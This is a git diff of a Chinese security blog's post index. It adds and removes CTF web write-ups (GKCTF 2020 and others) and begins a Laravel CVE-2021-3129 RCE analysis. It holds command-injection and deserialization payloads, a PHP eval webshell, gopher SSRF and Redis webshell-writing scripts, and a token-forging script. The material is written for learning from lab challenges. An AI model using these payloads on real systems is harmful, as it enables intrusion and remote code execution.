-if(preg_match(&quot;/flag/i&quot;, $_GET[&quot;ip&quot;]))
-{
-    die(&quot;no flag&quot;);
-}
-
-system(&quot;ping -c 3 $_GET[ip]&quot;);
-
-?&gt; </code></pre>
-<p>简单命令拼接</p>
-<pre><code>ip=|cat%20*;</code></pre><h2 id="half-infiltration"><a href="#half-infiltration" class="headerlink" title="half_infiltration"></a>half_infiltration</h2><blockquote>
-<p>php反序列化 ssrf+gopher</p>
-</blockquote>
-<pre><code class="php">&lt;?php
-highlight_file(__FILE__);
-$flag = file_get_contents(&#39;ssrf.php&#39;);
-class Pass
-{
-
-    function read()
-    {
-        ob_start();
-        global $result;
-        print $result;
-    }
-}
-class User
-{
-    public $age, $sex, $num;
-    function __destruct()
-    {
-        $student = $this-&gt;age;
-        $boy = $this-&gt;sex;
-        $a = $this-&gt;num;
-        $student-&gt;$boy();
-        if (!(is_string($a)) || !(is_string($boy)) || !(is_object($student))) {
-            ob_end_clean();
-            exit();
-        }
-        global $$a;
-        $result = $GLOBALS[&#39;flag&#39;];
-        ob_end_clean();
-    }
-}
-if (isset($_GET[&#39;x&#39;])) {
-    unserialize($_GET[&#39;x&#39;])-&gt;get_it();
-}</code></pre>
-<p>参考第五空间的《do you know》，把原来的payload改一改变量名即可</p>
-<blockquote>
-<p>考点：</p>
-<ol>
-<li>反序列化一个数组使其能够输出flag</li>
-<li>$$变量覆盖</li>
-<li>throw exception异常提前中断跳出ob_end_clean()</li>
-<li>global处触发exception，因为global $this是非法的</li>
-</ol>
-</blockquote>
-<pre><code class="php">&lt;?php
-class Pass
-{
-
-}
-
-class User
-{
-    public $age,$sex,$num;
-}
-
-$a = new User();
-$a-&gt;age = new Pass();
-$a-&gt;sex = &#39;read&#39;;
-$a-&gt;num = &#39;result&#39;;
-
-$b = new User();
-$b-&gt;age = new Pass();
-$b-&gt;sex = &#39;read&#39;;
-$b-&gt;num = &#39;this&#39;;
-
-$c = &quot;Tyao&quot;;
-$x = array($a, $b, $c);
-echo(serialize($x));
-
-/* 
-output:
-a:3:{i:0;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:6:%22result%22;}i:1;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:4:%22this%22;}i:2;s:4:%22Tyao%22;}
-*/</code></pre>
-<p>转到内网渗透，给到一个ssrf接口，端口在40000，点进去只有一个文件上传，没有禁gopher协议，盲猜是gopher+ssrf</p>
-<pre><code class="php">&lt;?php 
-//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网
-    $url = $_GET[&#39;we_have_done_ssrf_here_could_you_help_to_continue_it&#39;] ?? false; 
-        if(preg_match(&quot;/flag|var|apache|conf|proc|log/i&quot; ,$url)){
-                die(&quot;&quot;);
-        }
-
-        if($url)
-    { 
-
-            $ch = curl_init(); 
-            curl_setopt($ch, CURLOPT_URL, $url); 
-            curl_setopt($ch, CURLOPT_HEADER, 1);
-            curl_exec($ch);
-            curl_close($ch); 
-
-     } 
-
-?&gt;</code></pre>
-<p>这里很多坑，文件名不能含有<code>write</code>，一度以为<code>filter</code>写不了文件，后来才发现<code>write</code>是可以省略的 : ）</p>
-<p>文件内容不能含有<code>&lt;?</code>、<code>php</code>、<code>&lt;script</code>等等标签，需要<strong>同时</strong>用<code>rot13</code>和<code>base64</code>绕过（也不太懂什么base64之后也可以检测到<code>php</code>字段</p>
-<pre><code class="python">base64_encode(rot13(&#39;&lt;?php echo system(&quot;cat /flag&quot;);//&#39;)) = &quot;PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v&quot;</code></pre>
-<p>给出最终exp</p>
-<pre><code class="python">import requests as rq
-import re
-
-ssid = &quot;ttt&quot;
-post_string = &quot;file=php://filter/convert.base64-decode|string.rot13/resource=1.php&amp;content=PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v&quot;
-length = len(post_string)
-
-paramsGet = {&quot;we_have_done_ssrf_here_could_you_help_to_continue_it&quot;:&quot;gopher://127.0.0.1:40000/_POST /index.php HTTP/1.1%%0d%%0a\
-Host:127.0.0.1:40000%%0d%%0aCookie:PHPSESSID=%s;%%0d%%0aConnection:close%%0d%%0aContent-Type:application/x-www-form-urlencoded%%0d%%0aContent-Length: %d%%0d%%0a%%0d%%0a\
-%s&quot; % (ssid, length, post_string)}
-res = rq.get(&quot;http://39.98.131.124/ssrf.php&quot;, params=paramsGet)
-# print(res.text)
-
-res2 = rq.get(&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/&quot;)
-files = re.findall(&#39;&lt;a href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&#39;, res2.text)[5:]
-print(&quot;=========FILES============&quot;)
-print(&quot;\n&quot;.join(files))
-print(&quot;==========================&quot;)
-
-res3 = rq.get(&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/1.php&quot;)
-print(res3.text)</code></pre>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2020 GYXCTF Web</title>
     <url>/2020/03/18/2020-GYXCTF-Web/</url>
     <content><![CDATA[<p>师傅们出的题目都挺有意思</p>
@@ -2198,6 +1284,334 @@ try:
 except Exception as e:
     print(repr(e))
     print(&quot;Something wrong&quot;)</code></pre>]]></content>
+  </entry>
+  <entry>
+    <title>2020-GKCTF-WEB</title>
+    <url>/2020/05/28/2020-GKCTF-Web/</url>
+    <content><![CDATA[<p>找了个时间复现了 GKCTF 的 WEB 题目</p>
+<a id="more"></a>
+
+<h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><p><strong>代码执行</strong></p>
+<p>进去给到源码，给了我们一个小马</p>
+<pre><code class="php">&lt;?php 
+highlight_file(__FILE__);
+class ClassName
+{
+        public $code = null;
+        public $decode = null;
+        function __construct()
+        {
+                $this-&gt;code = @$this-&gt;x()[&#39;Ginkgo&#39;];
+                $this-&gt;decode = @base64_decode( $this-&gt;code );
+                @Eval($this-&gt;decode);
+        }
+
+        public function x()
+        {
+                return $_REQUEST;
+        }
+}
+new ClassName();</code></pre>
+<p>先上一个小马</p>
+<pre><code class="php">php &gt; echo base64_encode(&#39;eval($_REQUEST[kk]);&#39;);
+ZXZhbCgkX1JFUVVFU1Rba2tdKTs=</code></pre>
+<p>看看 phpinfo</p>
+<pre><code>?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=phpinfo();</code></pre><p>绕 disable_functions</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113759.png" alt="image-20200528103728833"></p>
+<p>蚁剑连上去，flag 需要 /readflag</p>
+<p>可以直接用这个绕  <a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p>
+<p>上传到 /tmp 目录，直接包含就好</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113803.png" alt></p>
+<p>执行命令</p>
+<pre><code>?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=include(&quot;/tmp/exploit.php&quot;);&amp;cmd=/readflag</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113808.png" alt="image-20200528105315601"></p>
+<h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><p><strong>cve-2020-7066</strong></p>
+<p>exp 在这里 <a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=79329</a></p>
+<p>直接打就好，访问 127.0.0.1 返回 hint</p>
+<pre><code>?url=http://127.0.0.1%00.ctfhub.com</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164116.png" alt="image-20200528110116218"></p>
+<pre><code>?url=http://127.0.0.123%00.ctfhub.com</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164121.png" alt="image-20200528110131001"></p>
+<h2 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h2><p><strong>弱口令+后台geishell+提权</strong></p>
+<p>参考 <a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">http://www.nctry.com/1660.html</a> 后台getshell</p>
+<p>我这里扔了一个冰蝎的马，连上读 /flag</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164128.png" alt="image-20200528110926892"></p>
+<p>读了个寂寞，提示日期很重要</p>
+<p>上传个 <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a> 读一下信息</p>
+<p>在进程信息那里我们看到了 root 在执行一个 /auto.sh</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164131.png" alt="image-20200528112105303"></p>
+<p>看一下文件，这也是解释了进程为什么一直有 sleep 60 这个操作</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164137.png" alt="image-20200528112206309"></p>
+<p>看一下 py 文件</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164139.png" alt="image-20200528112300934"></p>
+<p>这很显然就是我们的变量劫持，看一下权限</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113824.png" alt="image-20200528112351256"></p>
+<p>所以我们可以通过改写这个 py 文件提权</p>
+<p>其实，这个 /auto.sh 也是可写的，我们也可以改这个</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113826.png" alt="image-20200528112456969"></p>
+<p>我这里就直接改 py 了</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113829.png" alt="image-20200528113533012"></p>
+<p>等个一分钟收割 flag</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113831.png" alt="image-20200528113511733"></p>
+<h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><p><strong>内网+redis写shell</strong></p>
+<p>进去源码有提示</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113834.png" alt="image-20200528113752714"></p>
+<p>给到了一个 hosts 的信息</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113906.png" alt="image-20200528113904509"></p>
+<p>尝试访问 localhost 被 waf</p>
+<pre><code>/index.php?url=http://127.0.0.1&amp;submit=提交</code></pre><p>那就改成内网地址试试</p>
+<pre><code>/index.php?url=http://173.235.100.10&amp;submit=提交</code></pre><p>返回了正常页面</p>
+<p>这里我们揣测出题人的思路，那应该就是让我扫内网地址，直接 bp，发现了这个比较特殊</p>
+<pre><code>/index.php?url=http://173.235.100.11&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114349.png" alt="image-20200528114209680"></p>
+<p>那就是让我们去扫描端口，继续 bp 扫常用端口，发现 redis 有回显</p>
+<blockquote>
+<p>记住要扫常用服务，不要从1开始扫，不然要很久</p>
+</blockquote>
+<pre><code>/index.php?url=http://173.235.100.11:6379&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114356.png" alt="image-20200528114347813"></p>
+<p>gopher 协议没有 ban，发现可以 redis 随意写 shell</p>
+<blockquote>
+<p>注意编码问题就好</p>
+</blockquote>
+<p>这里直接贴上 payload</p>
+<pre><code class="python">import urllib
+import requests as rq
+
+protocol=&quot;gopher://&quot;
+ip=&quot;173.19.221.11&quot;
+port=&quot;6379&quot;
+shell=&quot;\n\n\n\n&lt;?php system(&#39;ls / -al&#39;);system(&#39;cat /flag&#39;); ?&gt;\n\n\n\n&quot;
+filename=&quot;index.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
+     &quot;config set dir {}&quot;.format(path),
+     &quot;config set dbfilename {}&quot;.format(filename),
+     &quot;save&quot;,
+     &quot;quit&quot;
+     ]
+if passwd:
+    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+    CRLF=&quot;\r\n&quot;
+    redis_arr = arr.split(&quot; &quot;)
+    cmd=&quot;&quot;
+    cmd+=&quot;*&quot;+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+    cmd+=CRLF
+    return cmd
+
+if __name__==&quot;__main__&quot;:
+    for x in cmd:
+        payload += redis_format(x).replace(&quot;\r\n&quot;,&quot;%250D%250A&quot;).replace(&quot;\n&quot;,&quot;%250A&quot;).replace(&quot;?&quot;,&quot;%253f&quot;)
+    print(payload)</code></pre>
+<blockquote>
+<p>这里我省了步骤，我是先看了 phpinfo()，发现没有 ban system()，再列一个目录，再看 flag 在哪</p>
+</blockquote>
+<p>上传之后回显成功</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114937.png" alt="image-20200528114934084"></p>
+<p>访问内网机子就能看到</p>
+<pre><code>/index.php?url=http://173.235.100.11&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528115043.png" alt="image-20200528115041491"></p>
+<h2 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h2><p><strong>nodejs</strong></p>
+<p>上来给了代码和版本，直接代码审计</p>
+<p>总体逻辑就是绕过这里的 waf</p>
+<pre><code class="js">app.use((req, res, next) =&gt; {
+  if (req.path === &#39;/eval&#39;) {
+    let delay = 60 * 1000;
+    console.log(delay);
+    if (Number.isInteger(parseInt(req.query.delay))) {
+      delay = Math.max(delay, parseInt(req.query.delay));
+    }
+    const t = setTimeout(() =&gt; next(), delay);
+    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
+    setTimeout(() =&gt; {
+      clearTimeout(t);
+      console.log(&#39;timeout&#39;);
+      try {
+        res.send(&#39;Timeout!&#39;);
+      } catch (e) {
+
+      }
+    }, 1000);
+  } else {
+    next();
+  }
+});</code></pre>
+<p>就可以直接 eval 了</p>
+<pre><code class="js">app.post(&#39;/eval&#39;, function (req, res) {
+  let response = &#39;&#39;;
+  if (req.body.e) {
+    try {
+      response = saferEval(req.body.e);
+    } catch (e) {
+      response = &#39;Wrong Wrong Wrong!!!!&#39;;
+    }
+  }
+  res.send(String(response));
+});</code></pre>
+<p>waf 可以用 int 溢出漏洞绕过，所以传入 2147483648 绕过成功</p>
+<blockquote>
+<p>当 delay 大于 2147483647 或小于 1 时,延迟将设置为 1</p>
+</blockquote>
+<p>后面就是绕 saferEval 了，这个根据版本去搜一下就好 ，最新版本的一般在 github 的 issues 里找到，可以直接拿来用</p>
+<p><a href="https://github.com/commenthol/safer-eval/issues/11" target="_blank" rel="noopener">https://github.com/commenthol/safer-eval/issues/11</a></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528120421.png" alt="image-20200528120418230"></p>
+<h2 id="GKCTF2020-EZ三剑客-EzTypecho"><a href="#GKCTF2020-EZ三剑客-EzTypecho" class="headerlink" title="[GKCTF2020]EZ三剑客-EzTypecho"></a>[GKCTF2020]EZ三剑客-EzTypecho</h2><p><strong>反序列化</strong></p>
+<p><a href="https://www.kingkk.com/2018/07/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">Typecho反序列化漏洞复现</a></p>
+<p>原版本在 install.php 那会有一个反序列化</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121417.png" alt="image-20200528121416697"></p>
+<p>但是出题人在这里加多了一个 <code>if(!isset($_SESSION))</code></p>
+<p>但是后面还有一处，我们直接传入 <code>?start</code> 触发即可</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121358.png" alt="image-20200528121355676"></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121956.png" alt="image-20200528121820549"></p>
+<p>命令执行无限制，直接读 /flag 就好</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528122002.png" alt="image-20200528121954615"></p>
+<h2 id="GKCTF2020-Node-Exe"><a href="#GKCTF2020-Node-Exe" class="headerlink" title="[GKCTF2020]Node-Exe"></a>[GKCTF2020]Node-Exe</h2><p>第一次碰到这题目，无从下手，不过还挺有意思的</p>
+<p>先看一下程序运行逻辑，打开 admin 登陆进去，然后给你三个 flag，打开 fiddler 抓包发现是发送了一个含有 timestamp 的 json，id 对应的就是 flag 的位置</p>
+<blockquote>
+<p>命令行断点 bpu <a href="http://xxx.node3.buuoj.cn" target="_blank" rel="noopener">http://xxx.node3.buuoj.cn</a></p>
+</blockquote>
+<pre><code>{&quot;id&quot;:1,&quot;timestamp&quot;:1590639747000}</code></pre><p>直接修改 id = 3 会返回</p>
+<pre><code>{&quot;message&quot;:&quot;HaHa Hacker!!!&quot;}</code></pre><p>写脚本伪造 timestamp 也失败</p>
+<p>所以后台应该是验证了 token</p>
+<p>还是去看看源码吧，把安装程序改成 zip 解压一下，源码在 </p>
+<pre><code>/app-64/resources/app.asar</code></pre><p>进行反编译</p>
+<pre><code>npm install -g asar
+asar extract app.asar app</code></pre><p>看一下 buyflag 的逻辑</p>
+<pre><code class="js">buyFlag: function(e) {
+    var i = this;
+    return c()(a.a.mark((function t() {
+        var o;
+        return a.a.wrap((function(t) {
+            for (;;) switch (t.prev = t.next) {
+            case 0:
+                return o = {
+                    id: e,
+                    timestamp: Date.parse(new Date)
+                },
+                t.t0 = i.$http,
+                t.t1 = i.url + &quot;/buyflag&quot;,
+                t.t2 = o,
+                t.next = 6,
+                i.makeToken(o);
+            case 6:
+                t.t3 = t.sent,
+                t.t4 = {
+                    token: t.t3
+                },
+                t.t5 = {
+                    headers: t.t4
+                },
+                t.t6 = function(e) {
+                    i.$Modal.info({
+                        title: &quot;购买结果&quot;,
+                        content: e.data[0].flag
+                    })
+                },
+                t.t0.post.call(t.t0, t.t1, t.t2, t.t5).then(t.t6);
+            case 11:
+            case &quot;end&quot;:
+                return t.stop()
+            }
+        }), t, i)
+    })))()
+}</code></pre>
+<p>看一下 makeToken</p>
+<pre><code class="js">makeToken: function(e) {
+    var i = this;
+    return c()(a.a.mark((function t() {
+        var o, r;
+        return a.a.wrap((function(t) {
+            for (;;) switch (t.prev = t.next) {
+            case 0:
+                return &quot;31169fedc9a20ecf&quot;,
+                &quot;d96adeefaa0102a9&quot;,
+                o = f()(n()(e)),
+                t.next = 5,
+                i.encrypt(&quot;31169fedc9a20ecf&quot;, &quot;d96adeefaa0102a9&quot;, o);
+            case 5:
+                return r = t.sent,
+                t.abrupt(&quot;return&quot;, r);
+            case 7:
+            case &quot;end&quot;:
+                return t.stop()
+            }
+        }), t, i)
+    })))()
+}</code></pre>
+<p>再看一下 encrypt</p>
+<pre><code class="js">encrypt: function(e, i, t) {
+    var o = this;
+    return c()(a.a.mark((function n() {
+        return a.a.wrap((function(o) {
+            for (;;) switch (o.prev = o.next) {
+            case 0:
+                return o.abrupt(&quot;return&quot;, new s.a((function(o) {
+                    var n = p.a.createCipheriv(&quot;aes-128-cbc&quot;, e, i),
+                    r = n.update(t, &quot;utf8&quot;, &quot;binary&quot;);
+                    r += n.final(&quot;binary&quot;),
+                    o(r = new Buffer.from(r, &quot;binary&quot;).toString(&quot;hex&quot;))
+                })));
+            case 1:
+            case &quot;end&quot;:
+                return o.stop()
+            }
+        }), n, o)
+    })))()
+},</code></pre>
+<p>所以 token 使用了 <code>aes-128-cbc</code> 进行对经过了 <code>o=f()(n()(e))</code> 处理的 json 进行加密，key 是 <code>31169fedc9a20ecf</code>，iv 是 <code>d96adeefaa0102a9</code></p>
+<p>随便拿一个 token 试验一下</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164157.png" alt="image-20200528150727592"></p>
+<p>32 位的我们拿 md5 测试一下</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164154.png" alt="image-20200528150920692"></p>
+<p>可以看到是吻合的，这里贴上脚本</p>
+<pre><code class="python"># coding:utf-8
+from Crypto.Cipher import AES
+from binascii import b2a_hex, a2b_hex
+import time, json, datetime, hashlib
+import requests as rq
+
+def encrypt(raw):
+    BS = 16
+    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
+    key = b&#39;31169fedc9a20ecf&#39;
+    iv = b&#39;d96adeefaa0102a9&#39;
+    raw = pad(raw).encode()
+    cryptor = AES.new(key, AES.MODE_CBC, iv)
+    ciphertext = cryptor.encrypt(raw)
+    return b2a_hex(ciphertext).decode()
+
+def get_data_token():
+    dtime = datetime.datetime.now()
+    t = int(time.mktime(dtime.timetuple())) * 1000
+    data = json.dumps({&quot;id&quot;:&quot;3||1&quot;, &quot;timestamp&quot;:t}).replace(&#39; &#39;,&#39;&#39;)
+    print(&quot;[+] data：%s&quot; % data)
+    token = encrypt(hashlib.md5(data.encode()).hexdigest())
+    print(&quot;[+] token：%s&quot; % token)
+    headers = {
+        &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;,
+        &quot;token&quot;:token
+    }
+    return data, headers
+
+if __name__== &quot;__main__&quot;:
+    url = &quot;http://1165bc7f-ecfb-45e8-bbc5-533876f73e8d.node3.buuoj.cn/buyflag&quot;
+    data, headers = get_data_token()
+    res = rq.post(url, data=data, headers=headers)
+    print(res.text)
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164148.png" alt="image-20200528162837226"></p>
+<blockquote>
+<p>需要注意的是</p>
+<ol>
+<li>使用 json.dumps 要把结果的空格都去掉</li>
+<li>AES 加密使用的 padding 是 pkcs5</li>
+<li>时间戳的获取一定要用 datetime()，不能用直接 time.time() </li>
+</ol>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
   </entry>
   <entry>
     <title>Cobalt Strike Learn</title>
@@ -2685,6 +2099,559 @@ print(flag)
       </tags>
   </entry>
   <entry>
+    <title>Laravel Debug mode RCE复现</title>
+    <url>/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<blockquote>
+<p>CVE-2021-3129</p>
+<p>Laravel &lt;= 8.4.2</p>
+<p>Ignition &lt;= 2.5.1</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>在kali2020下复现</p>
+</blockquote>
+<pre><code class="cmd">git clone https://github.com/laravel/laravel.git    # 下载laravel源码
+cd laravel                                            # 切换到laravel目录
+git checkout -b e849812                              # 切换到存在漏洞的分支
+composer update                                        # 更新composer
+composer install                                       # composer安装依赖
+composer require facade/ignition==2.5.1                # 下载存在漏洞版本组件
+mv .env.example .env                                # 更改.env文件
+php artisan key:generate                             # 生成Application key
+php artisan serve                                    # 启动服务器</code></pre>
+<p> 创建<code>resource/views/hello.blade.php</code>模板</p>
+<pre><code class="html">&lt;html&gt;
+    &lt;body&gt;
+        &lt;h1&gt;hello, {{ $username }}&lt;/h1&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p> 在<code>routes/web.php</code>中添加路由</p>
+<pre><code class="php">Route::get(&#39;/hello&#39;, function () {
+    return view(&#39;hello&#39;);
+});</code></pre>
+<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>在修正未定义变量时存在一处<code>file_get_contents()</code>和一处<code>file_put_contents()</code>函数的第一参数可控，且在laravel中我们可以往log文件插入部分可控内容，且我们对log文件具有可写权限，导致我们可以通过把log文件覆写为phar文件，再通过phar反序列化实现命令执行</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调用栈分析"><a href="#调用栈分析" class="headerlink" title="调用栈分析"></a>调用栈分析</h3><p>访问新添加的路由<code>/laravel/public/hello</code>会抛出变量名未定义的错误，出现了一个按钮并提示按样例修改模板</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281210fa90afa0a5cfb6e9438b.png" alt="image-20210525133932073" style="zoom: 67%;">
+
+<p>点击<code>Make variable optional</code>按钮并抓包，发生漏洞的接口就是在<code>/laravel/public/_ignition/execute-solution</code>这里，可以看到这里传入了<code>viewFile</code>参数对文件进行操作</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281211e62811b5bb60e97317a9.png" alt="image-20210525141459623"></p>
+<p>通过在源码搜索<code>execute-solution</code>可以搜索到Web接口，可以看到<code>ExecuteSolutionController</code>类对象被当成函数调用，所以最终会触发其<code>__invoke()</code>函数</p>
+<pre><code class="php">namespace Facade\Ignition;
+class IgnitionServiceProvider extends ServiceProvider
+{
+    Route::post(&#39;execute-solution&#39;, ExecuteSolutionController::class) // 调用__invoke()函数
+        -&gt;middleware(IgnitionConfigValueEnabled::class.&#39;:enableRunnableSolutions&#39;)
+        -&gt;name(&#39;executeSolution&#39;);</code></pre>
+<p>我们跟进一下它的<code>__invoke()</code>函数，第一步是初始化变量，第二部就是处理参数</p>
+<pre><code class="php">namespace Facade\Ignition\Http\Controllers;
+class ExecuteSolutionController
+{
+
+    public function __invoke(
+        ExecuteSolutionRequest $request,
+        SolutionProviderRepository $solutionProviderRepository
+    ) {
+        $solution = $request-&gt;getRunnableSolution();
+
+        $solution-&gt;run($request-&gt;get(&#39;parameters&#39;, [])); // 跟进参数处理函数
+
+        return response(&#39;&#39;);
+    }
+}</code></pre>
+<p>根据<code>run()</code>函数，我们看到了<code>file_put_contents()</code>函数的第一个参数可控，我们还得跟进一下<code>makeOptional()</code>函数</p>
+<pre><code class="php">namespace Facade\Ignition\Solutions;
+class MakeViewVariableOptionalSolution implements RunnableSolution
+{
+    public function run(array $parameters = [])
+    {
+        $output = $this-&gt;makeOptional($parameters);
+        if ($output !== false) {
+            file_put_contents($parameters[&#39;viewFile&#39;], $output); // file_put_contents()的第一参数可控
+        }
+    }</code></pre>
+<p>在这里我们又看到了<code>file_get_contents()</code>函数第一个参数可控，后面就是修正操作，即为模板中的未定义变量添加一个判断条件</p>
+<pre><code class="php">namespace Facade\Ignition\Solutions;
+class MakeViewVariableOptionalSolution implements RunnableSolution
+{
+    public function makeOptional(array $parameters = [])
+    {
+        $originalContents = file_get_contents($parameters[&#39;viewFile&#39;]); // file_get_contents()的第一参数可控
+        $newContents = str_replace(&#39;$&#39;.$parameters[&#39;variableName&#39;], &#39;$&#39;.$parameters[&#39;variableName&#39;].&quot; ?? &#39;&#39;&quot;, $originalContents);
+
+        $originalTokens = token_get_all(Blade::compileString($originalContents));
+        $newTokens = token_get_all(Blade::compileString($newContents));
+
+        $expectedTokens = $this-&gt;generateExpectedTokens($originalTokens, $parameters[&#39;variableName&#39;]);
+
+        if ($expectedTokens !== $newTokens) {
+            return false;
+        }
+
+        return $newContents;
+    }</code></pre>
+<p>所以我们可以把上面的代码浓缩为下面两行，简称先读后写</p>
+<blockquote>
+<p>应该有好些不知名CMS都有这么写过</p>
+</blockquote>
+<pre><code class="php">$output = file_get_contents($parameters[&#39;viewFile&#39;]);
+file_put_contents($parameters[&#39;viewFile&#39;], $output);</code></pre>
+<h3 id="日志部分可控"><a href="#日志部分可控" class="headerlink" title="日志部分可控"></a>日志部分可控</h3><p>另外，我们可以对laravel的日志文件插入部分可控内容，默认目录是<code>storage/logs/laravel.log</code></p>
+<p>比如当我们传入</p>
+<pre><code class="php">viewFile: This is the controlled part</code></pre>
